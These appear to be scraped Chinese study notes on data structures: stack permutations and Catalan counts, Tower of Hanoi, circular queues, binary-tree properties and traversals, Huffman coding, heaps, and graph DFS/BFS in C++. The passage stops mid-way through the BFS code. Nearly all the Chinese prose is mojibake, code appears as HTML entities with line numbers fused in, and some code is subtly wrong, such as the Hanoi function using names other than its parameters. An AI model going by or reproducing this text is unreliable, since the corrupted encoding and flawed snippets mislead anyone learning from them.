123456F(n)&#x3D;F(0)*F(n-1)+F(1)*F(n-2)+...+F(n-1)*F(n-n)F(0)&#x3D;1F(1)&#x3D;F(0)*F(0)&#x3D;1F(2)&#x3D;F(0)*F(2-1)+F(0)*F(2-2)&#x3D;2F(3)&#x3D;F(0)*F(3-1)+F(1)*F(3-2)+F(2)*F(3-3)&#x3D;5F(4)&#x3D;F(0)*F(4-1)+F(1)*F(4-2)+F(2)*F(4-3)+F(3)*F(4-4)&#x3D;14 åœ¨1423åºåˆ—ä¸­ï¼Œæˆ‘ä»¬è§‚å¯Ÿå­åºåˆ—423ï¼Œå‘ç°2å¤¹åœ¨4å’Œ3ä¹‹é—´ï¼Œå³æœ€å¤§çš„æ•°å…ˆå‡ºæ ˆï¼Œæœ€å°çš„æ•°ä¸­é—´å‡ºæ ˆï¼Œä¸­é—´çš„æ•°æœ€åå‡ºæ ˆâ€”â€”è¿™æ— è®ºå¦‚ä½•ä¸å¯èƒ½å‡ºç°ï¼Œå› ä¸ºå®ƒè¿åæ ˆâ€œåè¿›å…ˆå‡ºâ€çš„ç‰¹ç‚¹ï¼›åŒæ ·2413åºåˆ—ä¸­1å¤¹åœ¨4å’Œ3ä¹‹é—´ï¼Œ3412åºåˆ—ä¸­1å¤¹åœ¨4å’Œ2ä¹‹é—´ï¼Œ4312åºåˆ—ä¸­1å¤¹åœ¨3å’Œ2ä¹‹é—´ï¼Œè¿™éƒ½è¿åLOFIè§„å¾‹ã€‚ é“¾å¼æ ˆç”¨å•é“¾è¡¨æ¥è¡¨ç¤ºæ ˆï¼Œä¸ºé“¾å¼æ ˆã€‚ é“¾å¼æ ˆæ— æ ˆæ»¡é—®é¢˜ã€‚ é“¾å¼æ ˆçš„æ ˆé¡¶åœ¨é“¾å¤´ã€‚ æ’å…¥å’Œåˆ é™¤åœ¨æ ˆé¡¶æ‰§è¡Œã€‚ *æ‹¬å·åŒ¹é… *ä¸­ç¼€è¡¨è¾¾å¼è½¬æ¢æˆåç¼€è¡¨è¾¾å¼ é™¤å·¦æ‹¬å·å’Œå³æ‹¬å·å¤–ï¼ŒåŒä¸€æ“ä½œç¬¦æ ˆå†…ä¼˜å…ˆçº§å¤§äºæ ˆå¤–ä¼˜å…ˆçº§ã€‚ è‹¥æ ˆå¤–æ“ä½œç¬¦ä¼˜å…ˆçº§å¤§äºæ ˆå†…æ“ä½œç¬¦ï¼Œåˆ™æ ˆå¤–æ“ä½œç¬¦è¿›æ ˆï¼›å¦åˆ™ï¼Œå‡ºæ ˆã€‚ æ ˆä¸é€’å½’ å®šä¹‰æ˜¯é€’å½’çš„ï¼ˆæ–æ³¢é‚£å¥‘æ•°åˆ—ï¼‰ æ•°æ®ç»“æ„æ˜¯é€’å½’çš„ï¼ˆæ ‘ï¼Œé“¾è¡¨ï¼‰ é—®é¢˜è§£æ³•æ˜¯é€’å½’çš„ æ±‰è¯ºå¡”é—®é¢˜ ç”¨ C æŸ±åšè¿‡æ¸¡ï¼Œå°† A æŸ±ä¸Šçš„ (n-1) ä¸ªç›˜å­ç§»åˆ° B æŸ±ä¸Šï¼› å°† A æŸ±ä¸Šæœ€åä¸€ä¸ªç›˜å­ç›´æ¥ç§»åˆ° C æŸ±ä¸Šï¼› ç”¨ A æŸ±åšè¿‡æ¸¡ï¼Œå°† B æŸ±ä¸Šçš„ (n-1) ä¸ªç›˜å­ç§»åˆ° C æŸ±ä¸Šã€‚ 123456789101112131415void Hanoi(int n,char a,char b,char c)&#123; if(n==1)&#123; move(n,A,C); &#125; else&#123; Hanoi(n-1,A,C,B); move(n,A,C); Hanoi(n-1,B,A,C); &#125; &#125;void move(int n,char A,char C)&#123; cout &lt;&lt; \"Move \"&lt;&lt; n &lt;&lt;\"From \"&lt;&lt; A &lt;&lt;\"To \"&lt;&lt; C;&#125; é˜Ÿåˆ—é˜Ÿåˆ—çš„å®šä¹‰ï¼š åªå…è®¸åœ¨ä¸€ç«¯åˆ é™¤ï¼Œåœ¨å¦ä¸€ç«¯æ’å…¥çš„çº¿æ€§è¡¨ã€‚ï¼ˆå…ˆè¿›å…ˆå‡ºï¼‰ é˜Ÿå¤´ï¼šå…è®¸åˆ é™¤çš„=ä¸€ç«¯ã€‚ é˜Ÿå°¾ï¼šå…è®¸æ’å…¥çš„ä¸€ç«¯ã€‚ å¾ªç¯é˜Ÿåˆ— é˜Ÿåˆ—åˆå§‹åŒ–ï¼š=front = rear = 0; é˜Ÿå¤´æŒ‡é’ˆè¿›1: front = (front+1) % maxSize; é˜Ÿå°¾æŒ‡é’ˆè¿›1: rear = (rear+1) % maxSize; é˜Ÿç©ºæ¡ä»¶ï¼šfront == rear; é˜Ÿæ»¡æ¡ä»¶ï¼š(rear+1) % maxSize == front ; å¾ªç¯é˜Ÿåˆ—åªèƒ½å­˜æ”¾ï¼ˆmaxSize-1ï¼‰ä¸ªå…ƒç´ ï¼› å¾ªç¯é˜Ÿåˆ—ä¸­å…ƒç´ çš„ä¸ªæ•°ä¸ºï¼š(rear-front+maxSize)%maxSize; é“¾å¼é˜Ÿåˆ— é˜Ÿå¤´åœ¨é“¾å¤´ï¼Œé˜Ÿå°¾åœ¨é“¾å°¾ã€‚ é˜Ÿç©ºä¸º front == NULL æ•°ç»„æ•°ç»„çš„å­˜å‚¨è¡¨ç¤ºï¼š è®¾ç¬¬ä¸€ä¸ªæ•°ç»„å…ƒç´ çš„å­˜å‚¨åœ°å€ä¸ºaï¼Œæ¯ä¸€ä¸ªæ•°ç»„å…ƒç´ çš„å­˜å‚¨å¤§å°ä¸ºl åœ¨ä¸€ç»´æ•°ç»„ä¸­ï¼š$LOC(i)=a+i*l$ åœ¨äºŒç»´æ•°ç»„ä¸­,æŒ‰ç…§è¡Œä¼˜å…ˆå­˜å‚¨ï¼Œæ¯ä¸€è¡Œæœ€å¤šå­˜å‚¨å…ƒç´ ä¸ºmä¸ªï¼š$LOC(j,k)=a+(j*m+k)l$ æ•£åˆ—è¡¨æ ‘æ ‘çš„åŸºæœ¬æ¦‚å¿µç»“ç‚¹çš„å±‚æ¬¡ï¼šæ ¹èŠ‚ç‚¹åœ¨ç¬¬ä¸€å±‚ï¼Œå…¶ä»–ç±»æ¨ã€‚ æ·±åº¦ï¼šæ ‘ä¸­è·ç¦»æ ¹ç»“ç‚¹æœ€è¿œçš„ç»“ç‚¹æ‰€åœ¨çš„å±‚æ¬¡å«åšæ ‘çš„æ·±åº¦ã€‚ é«˜åº¦ï¼šé«˜åº¦ä¸æ·±åº¦æ•°å€¼ç›¸ç­‰ï¼Œä½†æ–¹å‘ä¸åŒã€‚æ ¹èŠ‚ç‚¹çš„é«˜åº¦å°±å«åšæ ‘çš„é«˜åº¦ã€‚ ç»“ç‚¹çš„åº¦ï¼šç»“ç‚¹æ‰€æ‹¥æœ‰çš„å­æ ‘æ£µæ ‘ã€‚ æ ‘çš„åº¦ï¼šæ ‘ä¸­ç»“ç‚¹çš„åº¦çš„æœ€å¤§å€¼ã€‚ äºŒå‰æ ‘äºŒå‰æ ‘çš„å®šä¹‰ æ¯ä¸ªç»“ç‚¹æœ€å¤šæœ‰ä¸¤æ£µå­æ ‘ å·¦å­æ ‘å’Œå³å­æ ‘ä¸å¯é¢ å€’ äºŒå‰æ ‘çš„äº”ç§å½¢æ€ï¼š äºŒå‰æ ‘çš„æ€§è´¨ äºŒå‰æ ‘çš„ç¬¬iå±‚æœ€å¤šæœ‰$2^{i-1}$ä¸ªç»“ç‚¹ æ·±åº¦ä¸ºkçš„äºŒå‰æ ‘æœ€å°‘æœ‰kä¸ªç»“ç‚¹ï¼Œæœ€å¤šæœ‰$2^k-1$ä¸ªç»“ç‚¹ å¯¹ä»»ä½•ä¸€æ£µäºŒå‰æ ‘ï¼Œå¦‚æœå…¶å¶ç»“ç‚¹æœ‰ n0 ä¸ª, åº¦ä¸º 2 çš„éå¶ç»“ç‚¹æœ‰ n2 ä¸ª, åˆ™æœ‰n0ï¼n2ï¼‹1 å…·æœ‰ n (nâ‰¥0) ä¸ªç»“ç‚¹çš„å®Œå…¨äºŒå‰æ ‘çš„æ·±åº¦ä¸º $\\lceil log2(n+1)\\rceil$ å¦‚å°†ä¸€æ£µæœ‰nä¸ªç»“ç‚¹çš„å®Œå…¨äºŒå‰æ ‘è‡ªé¡¶å‘ä¸‹ï¼ŒåŒä¸€å±‚è‡ªå·¦å‘å³è¿ç»­ç»™ç»“ç‚¹ç¼–å·1, 2, â€¦, nï¼Œåˆ™æœ‰ä»¥ä¸‹å…³ç³»ï¼šè‹¥i = 1, åˆ™ i æ— åŒäº²è‹¥i &gt; 1, åˆ™ i çš„åŒäº²ä¸º$\\lfloor iï¼2\\rfloor$i çš„å·¦å­å¥³ä¸º 2 i(å¦‚æœiæœ‰å·¦å­å¥³çš„è¯)ï¼Œ i çš„å³å­å¥³ä¸º2 i+1 (å¦‚æœiæœ‰å³å­å¥³çš„è¯)è‹¥ i ä¸ºå¥‡æ•°, ä¸”i != 1, åˆ™å…¶å·¦å…„å¼Ÿä¸ºi-1,è‹¥ i ä¸ºå¶æ•°, ä¸”i != 1, åˆ™å…¶å³å…„å¼Ÿä¸ºi+1 æ»¡äºŒå‰æ ‘æ¯ä¸€å±‚ç»“ç‚¹éƒ½è¾¾åˆ°äº†æœ€å¤§ä¸ªæ•°çš„äºŒå‰æ ‘ã€‚æ·±åº¦ä¸ºkçš„æ»¡äºŒå‰æ ‘æœ‰$2^k-1$ä¸ªã€‚ å®Œå…¨äºŒå‰æ ‘è‹¥è®¾äºŒå‰æ ‘çš„æ·±åº¦ä¸º kï¼Œåˆ™å…±æœ‰ k å±‚ã€‚é™¤ç¬¬ k å±‚å¤–ï¼Œå…¶å®ƒå„å±‚ (1â€”k-1) çš„ç»“ç‚¹æ•°éƒ½è¾¾åˆ°æœ€å¤§ä¸ªæ•°ï¼Œç¬¬kå±‚ä»å³å‘å·¦è¿ç»­ç¼ºè‹¥å¹²ç»“ç‚¹ï¼Œè¿™å°±æ˜¯å®Œå…¨äºŒå‰æ ‘ã€‚ï¼ˆåŒºåˆ†éå®Œå…¨äºŒå‰æ ‘ï¼‰ äºŒå‰æ ‘çš„å­˜å‚¨è¡¨ç¤ºé¡ºåºå­˜å‚¨å®Œå…¨äºŒå‰æ ‘ éå®Œå…¨äºŒå‰æ ‘ é—®ï¼šé¡ºåºå­˜å‚¨åèƒ½å¦å¤åŸæˆå”¯ä¸€å¯¹åº”çš„äºŒå‰æ ‘å½¢çŠ¶ï¼Ÿ ç­”ï¼šè‹¥æ˜¯å®Œå…¨/æ»¡äºŒå‰æ ‘åˆ™å¯ä»¥åšåˆ°å”¯ä¸€å¤åŸã€‚ å› ä¸ºæ ¹æ®æ€§è´¨5ï¼šå¯çŸ¥ç»“ç‚¹iï¼Œå·¦å­©å­çš„ä¸‹æ ‡å€¼å¿…ä¸º2iï¼Œ å…¶å³å­©å­çš„ä¸‹æ ‡å€¼å¿…ä¸º2iï¼‹1. éå®Œå…¨äºŒå‰æ ‘è¦å°†å„å±‚ç©ºç¼ºå¤„ç»Ÿç»Ÿè¡¥ä¸Šâ€œè™šç»“ç‚¹â€ï¼Œå…¶å†…å®¹ä¸ºç©ºã€‚ é“¾è¡¨å­˜å‚¨äºŒå‰æ ‘ç»“ç‚¹å®šä¹‰ï¼š å«nä¸ªç»“ç‚¹çš„äºŒå‰é“¾è¡¨å…¶ä¸­ç©ºæŒ‡é’ˆåŸŸä¸ºn+1ä¸ªï¼Œéç©ºæŒ‡é’ˆåŸŸä¸ºn-1ä¸ªã€‚ äºŒå‰æ ‘éå†==äºŒå‰æ ‘çš„éå†å°±æ˜¯æŒ‰æŸç§æ¬¡åºè®¿é—®æ ‘ä¸­çš„ç»“ç‚¹ï¼Œè¦æ±‚æ¯ä¸ªç»“ç‚¹è®¿é—®ä¸€æ¬¡ä¸”ä»…è®¿é—®ä¸€æ¬¡ã€‚== äºŒå‰æ ‘éå†çš„é€’å½’ç®—æ³•å¯¹æ ¹çš„è®¿é—®æ—¶æœºä¸åŒï¼Œæœ‰ä¸‰ç§å®ç°æ–¹æ¡ˆï¼š 123VLRï¼ˆå‰åºï¼‰LVRï¼ˆä¸­åºï¼‰LRVï¼ˆååºï¼‰ å‰åºéå†äºŒå‰æ ‘ è‹¥äºŒå‰æ ‘ä¸ºç©ºï¼Œåˆ™ ç©ºæ“ä½œï¼›å¦åˆ™ (1) è®¿é—®æ ¹ç»“ç‚¹ï¼› (2) å…ˆåºéå†å·¦å­æ ‘ï¼› (3) å…ˆåºéå†å³å­æ ‘ã€‚ ä¸­åºéå†äºŒå‰æ ‘ è‹¥äºŒå‰æ ‘ä¸ºç©ºï¼Œ åˆ™ç©ºæ“ä½œï¼›å¦åˆ™ (1) ä¸­åºéå† å·¦å­æ ‘ï¼› (2) è®¿é—®æ ¹ç»“ç‚¹ï¼› (3) ä¸­åºéå†å³å­æ ‘ã€‚ ååºéå†äºŒå‰æ ‘ è‹¥äºŒå‰æ ‘ä¸ºç©ºï¼Œåˆ™ ç©ºæ“ä½œï¼›å¦åˆ™ (1) ååºéå† å·¦å­æ ‘ï¼› (2) ååºéå† å³å­æ ‘ï¼› (3) è®¿é—®æ ¹ç»“ç‚¹ 12345678910//å‰åºéå†void preOrder(BiTree T)&#123; if(T)&#123; cout &lt;&lt; T-&gt;data &lt;&lt; endl; preOrder(T-&gt;lchild); preOrder(T-&gt;rchild); &#125;&#125;//ä¸­åºå’Œååºçœ‹è®¿é—®çš„æ¬¡åº äºŒå‰æ ‘ç®—æ³•è®¾è®¡ç»ƒä¹  1234567891011121314151617181920212223//äºŒå‰æ ‘ç®—æ³•è®¾è®¡ç»ƒä¹ //è®¾è®¡ç®—æ³•æŒ‰å‰åºæ¬¡åºæ‰“å°äºŒå‰æ ‘ä¸­çš„å¶å­ç»“ç‚¹ã€‚void PreOrder(BiNode *root)&#123; if (root == NULL) return; else &#123; if (root-&gt;lchild ==NULL &amp;&amp; root-&gt;rchild==NULL) cout&lt;&lt;root-&gt;data; PreOrder(root-&gt;lchild); PreOrder(root-&gt;rchild); &#125;&#125;//è®¾è®¡ç®—æ³•æ±‚äºŒå‰æ ‘ä¸­å¶å­ç»“ç‚¹ä¸ªæ•°int CountLeaf (BiNode * T)&#123;// å…ˆåºéå†äºŒå‰æ ‘ï¼Œä»¥ count è¿”å›äºŒå‰æ ‘ä¸­å¶å­ç»“ç‚¹æ•° if ( T ==null) return 0; else if ((!T-&gt;Lchild)&amp;&amp; (!T-&gt;Rchild))return 1; else&#123; int a=CountLeaf( T-&gt;Lchild); int b = CountLeaf( T-&gt;Rchild); return a+b; &#125; &#125; äºŒå‰æ ‘éå†çš„éé€’å½’ç®—æ³•å‰åºéå† ä¸­åºéå† å±‚æ¬¡åºéå† 1234567891011121314template &lt;class T&gt;void BinaryTree&lt;T&gt;::levelOrder (void (*visit) (BinTreeNode&lt;T&gt; *t)) &#123; if (root == NULL) return; Queue&lt;BinTreeNode&lt;T&gt; * &gt; Q; BinTreeNode&lt;T&gt; *p = root; Q.EnQueue (p); while (!Q.IsEmpty ()) &#123; Q.DeQueue (p); visit(p); if (p-&gt;leftChild != NULL) Q.EnQueue (p-&gt;leftChild); if (p-&gt;rightChild != NULL) Q.EnQueue (p-&gt;rightChild); &#125; &#125;; äºŒå‰æ ‘çš„è®¡æ•°ç”±å…ˆåºåºåˆ—ç¡®å®šæ ¹ç»“ç‚¹ï¼Œå†ç”±ä¸­åºåºåˆ—æ‰¾å‡ºå·¦å³å­æ ‘ï¼Œå¯å”¯ä¸€ç¡®å®šä¸€æ£µäºŒå‰æ ‘ï¼ æ ‘å’Œæ£®æ—æ ‘çš„å­˜å‚¨è¡¨ç¤ºï¼šæ ‘ä¼šè½¬æ¢æˆäºŒå‰æ ‘ï¼Œé€šå¸¸ç”¨å·¦å­å¥³ï¼Œå³å…„å¼Ÿæ¥è¡¨ç¤ºã€‚ æ£®æ—å’ŒäºŒå‰æ ‘çš„è½¬æ¢æ£®æ—è½¬æ¢ä¸ºäºŒå‰æ ‘ å°†æ£®æ—ä¸­çš„æ¯æ£µæ ‘è½¬æ¢æˆäºŒå‰æ ‘ï¼› ä»ç¬¬äºŒæ£µäºŒå‰æ ‘å¼€å§‹ï¼Œä¾æ¬¡æŠŠåä¸€æ£µäºŒå‰æ ‘çš„æ ¹ç»“ç‚¹ä½œä¸ºå‰ä¸€æ£µäºŒå‰æ ‘æ ¹ç»“ç‚¹çš„å³å­©å­ï¼Œå½“æ‰€æœ‰äºŒå‰æ ‘è¿èµ·æ¥åï¼Œæ­¤æ—¶æ‰€å¾—åˆ°çš„äºŒå‰æ ‘å°±æ˜¯ç”±æ£®æ—è½¬æ¢å¾—åˆ°çš„äºŒå‰æ ‘ã€‚ æ ‘ä¸å’Œæ£®æ—çš„éå†æ·±åº¦ä¼˜å…ˆéå† æ£®æ—å’Œæ ‘ä¸€æ ·ã€‚ å¹¿åº¦ä¼˜å…ˆéå†æ£®æ—çš„å±‚æ¬¡åºéå†ï¼š ä¾æ¬¡éå†å„æ£µæ ‘çš„æ ¹èŠ‚ç‚¹ï¼› ä¾æ¬¡éå†å„æ£µæ ‘æ ¹èŠ‚ç‚¹çš„æ‰€æœ‰å­å¥³ï¼› å“ˆå¤«æ›¼æ ‘è·¯å¾„é•¿åº¦è·¯å¾„é•¿åº¦ï¼šä¸¤ä¸ªç»“ç‚¹ä¹‹é—´çš„è·¯å¾„é•¿åº¦ PL æ˜¯è¿æ¥ä¸¤ç»“ç‚¹çš„è·¯å¾„ä¸Šçš„åˆ†æ”¯æ•°ã€‚ æ ‘çš„è·¯å¾„é•¿åº¦ï¼šä»æ ‘æ ¹åˆ°æ¯ä¸€ç»“ç‚¹çš„è·¯å¾„é•¿åº¦ä¹‹å’Œã€‚ æ ‘çš„å¸¦æƒè·¯å¾„é•¿åº¦ï¼šè®¾æ ‘å…·æœ‰nä¸ªå¸¦æƒå€¼çš„å¶å­ç»“ç‚¹ï¼Œä»æ ¹ç»“ç‚¹åˆ°å„ä¸ªå¶å­ç»“ç‚¹çš„è·¯å¾„é•¿åº¦ä¸ç›¸åº”å¶å­ç»“ç‚¹æƒå€¼çš„ä¹˜ç§¯ä¹‹å’Œã€‚ è®°ä¸ºï¼š $WPL=\\sum_{k=1}^nW_kL_k$ å“ˆå¤«æ›¼æ ‘å¸¦æƒè·¯å¾„é•¿åº¦è¾¾åˆ°æœ€å°çš„æ‰©å……äºŒå‰æ ‘ä¸ºå“ˆå¤«æ›¼æ ‘ã€‚ ç‰¹ç‚¹ä¸ºï¼š æƒå€¼è¶Šå¤§çš„å¶å­ç»“ç‚¹è¶Šé è¿‘æ ¹ç»“ç‚¹ï¼Œè€Œæƒå€¼è¶Šå°çš„å¶å­ç»“ç‚¹è¶Šè¿œç¦»æ ¹ç»“ç‚¹ã€‚ åªæœ‰åº¦ä¸º0ï¼ˆå¶å­ç»“ç‚¹ï¼‰å’Œåº¦ä¸º2ï¼ˆåˆ†æ”¯ç»“ç‚¹ï¼‰çš„ç»“ç‚¹ï¼Œä¸å­˜åœ¨åº¦ä¸º1çš„ç»“ç‚¹ã€‚ è‹¥å“ˆå¤«æ›¼æ ‘æœ‰nä¸ªå¶èŠ‚ç‚¹ï¼Œåˆ™æ€»ç»“ç‚¹ä¸º2n-1ä¸ªã€‚ å“ˆå¤«æ›¼ç¼–ç å“ˆå¤«æ›¼ç¼–ç ç”¨å“ˆå¤«æ›¼ç¼–ç æ ‘æ¥è¡¨ç¤ºï¼ˆå·¦é›¶å³ä¸€ï¼‰ã€‚ å“ˆå¤«æ›¼ç¼–ç ç»“æœï¼š$WPL=1bit7+2bit5+3bit6=35bit$ åŸºæœ¬æ€æƒ³ï¼šæ¦‚ç‡å¤§çš„å­—ç¬¦ç”¨çŸ­ç ï¼Œæ¦‚ç‡å°çš„ç”¨é•¿ç ã€‚ ç»ƒä¹ ï¼šå‡è®¾ç”¨äºé€šä¿¡çš„ç”µæ–‡ä»…ç”±8ä¸ªå­—æ¯ {a, b, c, d, e, f, g, h} æ„æˆï¼Œå®ƒä»¬åœ¨ç”µæ–‡ä¸­å‡ºç°çš„æ¦‚ç‡åˆ†åˆ«ä¸º{ 0.07, 0.19, 0.02, 0.06, 0.32, 0.03, 0.21, 0.10}ï¼Œè¯•ä¸ºè¿™8ä¸ªå­—æ¯è®¾è®¡å“ˆå¤«æ›¼ç¼–ç ã€‚å¦‚æœç”¨0ï½7çš„äºŒè¿›åˆ¶ç¼–ç æ–¹æ¡ˆåˆå¦‚ä½•ï¼Ÿ ä¸€èˆ¬å·¦é¢æ˜¯å°æ•°ï¼Œå³é¢æ˜¯å¤§æ•°ã€‚ $WPLï¼2(0.19+0.32+0.21) + 4(0.07+0.06+0.10) +5(0.02+0.03) =1.44+0.92+0.25=2.61 $ å †æœ€å°å †ï¼šä»»ä¸€ç»“ç‚¹çš„å…³é”®ç å‡å°äºæˆ–ç­‰äºå®ƒçš„å·¦å³å­å¥³çš„å…³é”®ç ï¼Œä½äºå †é¡¶çš„ç»“ç‚¹çš„å…³é”®ç æ˜¯é›†åˆä¸­æœ€å°çš„ï¼Œæ‰€ä»¥ç§°ä¸ºæœ€å°å †ã€‚ æœ€å°å †çš„å½¢æˆ å›¾å›¾çš„åŸºæœ¬æ¦‚å¿µæœ‰å‘å›¾ï¼šå›¾Gä¸­çš„æ¯æ¡è¾¹éƒ½æ˜¯æœ‰æ–¹å‘çš„ï¼› æ— å‘å›¾ï¼šå›¾Gä¸­çš„æ¯æ¡è¾¹éƒ½æ˜¯æ— æ–¹å‘çš„ï¼› å®Œå…¨å›¾ ï¼šå›¾Gä»»æ„ä¸¤ä¸ªé¡¶ç‚¹éƒ½æœ‰ä¸€æ¡è¾¹ç›¸è¿æ¥ï¼›è‹¥æœ‰ n ä¸ªé¡¶ç‚¹çš„æ— å‘å›¾æœ‰ n(n-1)/2 æ¡è¾¹, åˆ™æ­¤å›¾ä¸ºå®Œå…¨æ— å‘å›¾ã€‚æœ‰ n ä¸ªé¡¶ç‚¹çš„æœ‰å‘å›¾æœ‰n(n-1) æ¡è¾¹, åˆ™æ­¤å›¾ä¸ºå®Œå…¨æœ‰å‘å›¾ã€‚ é¡¶ç‚¹çš„åº¦ï¼šä¸€ä¸ªé¡¶ç‚¹vçš„åº¦æ˜¯ä¸å®ƒç›¸å…³è”çš„è¾¹çš„æ¡æ•°ã€‚ è¿é€šå›¾ä¸è¿é€šåˆ†é‡ ï¼šåœ¨æ— å‘å›¾ä¸­, è‹¥ä»é¡¶ç‚¹v1åˆ°é¡¶ç‚¹v2æœ‰è·¯å¾„, åˆ™ç§°é¡¶ç‚¹v1ä¸v2æ˜¯è¿é€šçš„ã€‚å¦‚æœå›¾ä¸­ä»»æ„ä¸€å¯¹é¡¶ç‚¹éƒ½æ˜¯è¿é€šçš„, åˆ™ç§°æ­¤å›¾æ˜¯è¿é€šå›¾ã€‚éè¿é€šå›¾çš„æå¤§è¿é€šå­å›¾å«åšè¿é€šåˆ†é‡ã€‚ ==è¿™é‡Œè¦åˆ†æ¸…ä¸¤ä¸ªæ¦‚å¿µï¼šæå¤§è¿é€šå­å›¾ï¼ˆè¿é€šåˆ†é‡ï¼‰å’Œæå°è¿é€šå­å›¾ï¼ˆç”Ÿæˆæ ‘ï¼‰== æå¤§è¿é€šå­å›¾ è¿é€šå›¾åªæœ‰ä¸€ä¸ªæå¤§è¿é€šå­å›¾ï¼Œå°±æ˜¯å®ƒæœ¬èº« éè¿é€šå›¾çš„æå¤§è¿é€šå­å›¾å°±å«è¿é€šåˆ†é‡ï¼Œæ¯ä¸ªåˆ†é‡éƒ½æ˜¯ä¸€ä¸ªè¿é€šå›¾ã€‚ æå°è¿é€šå­å›¾ ä¸€ä¸ªè¿é€šå›¾çš„ç”Ÿæˆæ ‘å°±æ˜¯æå°è¿é€šå­å›¾ï¼Œå¹¶ä¸”æå°è”é€šå­å›¾åªå­˜åœ¨äºè¿é€šå›¾ä¸­ã€‚ æœ€æ˜æ˜¾çš„ç‰¹ç‚¹æ˜¯nä¸ªç»“ç‚¹ï¼Œn-1æ¡è¾¹ã€‚ å¼ºè¿é€šå›¾ä¸å¼ºè¿é€šåˆ†é‡ ï¼šåœ¨æœ‰å‘å›¾ä¸­, è‹¥å¯¹äºæ¯ä¸€å¯¹é¡¶ç‚¹viå’Œvj, éƒ½å­˜åœ¨ä¸€æ¡ä»viåˆ°vjå’Œä»vjåˆ°viçš„è·¯å¾„, åˆ™ç§°æ­¤å›¾æ˜¯å¼ºè¿é€šå›¾ã€‚éå¼ºè¿é€šå›¾çš„æå¤§å¼ºè¿é€šå­å›¾å«åšå¼ºè¿é€šåˆ†é‡ã€‚ ç”Ÿæˆæ ‘ ï¼šä¸€ä¸ªè¿é€šå›¾çš„ç”Ÿæˆæ ‘æ˜¯å…¶æå°è¿é€šå­å›¾ï¼Œåœ¨ n ä¸ªé¡¶ç‚¹çš„æƒ…å½¢ä¸‹ï¼Œæœ‰ n-1 æ¡è¾¹ã€‚ å›¾çš„å­˜å‚¨ç»“æ„é‚»æ¥çŸ©é˜µè¡¨ç¤º ç‰¹ç‚¹ï¼šå®Œå…¨å›¾çš„é‚»æ¥çŸ©é˜µä¸­ï¼Œå¯¹è§’å…ƒç´ å…¨ä¸º0ï¼Œå…¶ä½™å…¨ä¸º1ã€‚ ç½‘ç»œçš„é‚»æ¥çŸ©é˜µ é‚»æ¥çŸ©é˜µæ³•ä¼˜ç‚¹ï¼š å®¹æ˜“å®ç°å›¾çš„æ“ä½œï¼Œå¦‚ï¼šæ±‚æŸé¡¶ç‚¹çš„åº¦ã€åˆ¤æ–­é¡¶ç‚¹ä¹‹é—´æ˜¯å¦æœ‰è¾¹ï¼ˆå¼§ï¼‰ã€æ‰¾é¡¶ç‚¹çš„é‚»æ¥ç‚¹ç­‰ç­‰ã€‚ é‚»æ¥çŸ©é˜µæ³•ç¼ºç‚¹ï¼š nä¸ªé¡¶ç‚¹éœ€è¦n*nä¸ªå•å…ƒå­˜å‚¨è¾¹(å¼§);ç©ºé—´æ•ˆç‡ä¸ºO(n2)ã€‚ å¯¹ç¨€ç–å›¾è€Œè¨€å°¤å…¶æµªè´¹ç©ºé—´ã€‚ é‚»æ¥è¡¨è¡¨ç¤º ç‰¹ç‚¹ï¼šè‹¥å›¾ä¸­æœ‰nä¸ªé¡¶ç‚¹ï¼Œaæ¡è¾¹ æ— å‘å›¾ä¸­ï¼Œç”¨é‚»æ¥è¡¨è¡¨ç¤ºï¼Œéœ€è¦nä¸ªé¡¶ç‚¹ç»“ç‚¹ï¼Œ2aä¸ªè¾¹ç»“ç‚¹ã€‚ æœ‰å‘å›¾ä¸­ï¼Œç”¨é‚»æ¥è¡¨è¡¨ç¤ºï¼Œè‹¥ä¸è€ƒè™‘é€†é‚»æ¥è¡¨ï¼Œåªéœ€ n ä¸ªé¡¶ç‚¹ç»“ç‚¹ï¼Œa ä¸ªè¾¹ç»“ç‚¹ã€‚ ç½‘ç»œçš„é‚»æ¥è¡¨ å›¾çš„éå†æ·±åº¦ä¼˜å…ˆéå†ï¼ˆDFSï¼‰ 1234567891011121314151617181920212223//è¿é€šå›¾çš„æ·±åº¦éå† template&lt;class T, class E&gt; void DFS (Graph&lt;T, E&gt;&amp; G, int v, bool visited[]) &#123; cout &lt;&lt; G.getValue(v) &lt;&lt; ' '; //è®¿é—®é¡¶ç‚¹v visited[v] = true; //ä½œè®¿é—®æ ‡è®° int w = G.getFirstNeighbor (v); //ç¬¬ä¸€ä¸ªé‚»æ¥é¡¶ç‚¹ while (w != -1) &#123; //è‹¥é‚»æ¥é¡¶ç‚¹wå­˜åœ¨ if ( !visited[w] ) DFS(G, w, visited); //è‹¥wæœªè®¿é—®è¿‡, é€’å½’è®¿é—®é¡¶ç‚¹w w = G.getNextNeighbor (v, w); //ä¸‹ä¸€ä¸ªé‚»æ¥é¡¶ç‚¹ &#125;&#125;//å›¾çš„æ·±åº¦ä¼˜å…ˆæœç´¢ç®—æ³• template&lt;class T, class E&gt; void DFSTraverse (Graph&lt;T, E&gt;&amp; G, const T&amp; v) &#123; //ä»é¡¶ç‚¹vå‡ºå‘å¯¹å›¾Gè¿›è¡Œæ·±åº¦ä¼˜å…ˆéå†çš„ä¸»è¿‡ç¨‹ int i, loc, n = G.NumberOfVertices(); //é¡¶ç‚¹ä¸ªæ•° bool *visited = new bool[n]; //åˆ›å»ºè¾…åŠ©æ•°ç»„ for (i = 0; i &lt; n; i++) visited [i] = false; //è¾…åŠ©æ•°ç»„åˆå§‹åŒ– loc = G.getVertexPos(v); DFS (G, loc, visited); //ä»é¡¶ç‚¹0å¼€å§‹æ·±åº¦ä¼˜å…ˆæœç´¢ delete [] visited; //é‡Šæ”¾visited &#125; å¹¿åº¦ä¼˜å…ˆéå†ï¼ˆBFSï¼‰ 12345678910111213141516171819202122232425//å›¾çš„å¹¿åº¦ä¼˜å…ˆæœç´¢ç®—æ³• template &lt;class T, class E&gt; void BFS (Graph&lt;T, E&gt;&amp; G, const T&amp; v) &#123; int i, w, n = G.NumberOfVertices(); //å›¾ä¸­é¡¶ç‚¹ä¸ªæ•° bool *visited = new bool[n]; for (i = 0; i &lt; n; i++) visited[i] = false; int loc = G.getVertexPos (v); //å–é¡¶ç‚¹å· cout &lt;&lt; G.getValue (loc) &lt;&lt; ' '; //è®¿é—®é¡¶ç‚¹v visited[loc] = true; //åšå·²è®¿é—®æ ‡è®° Queue&lt;int&gt; Q; Q.EnQueue (loc); //é¡¶ç‚¹è¿›é˜Ÿåˆ—, å®ç°åˆ†å±‚è®¿é—® å›¾çš„å¹¿åº¦ä¼˜å…ˆæœç´¢ç®—æ³• while (!Q.IsEmpty()) 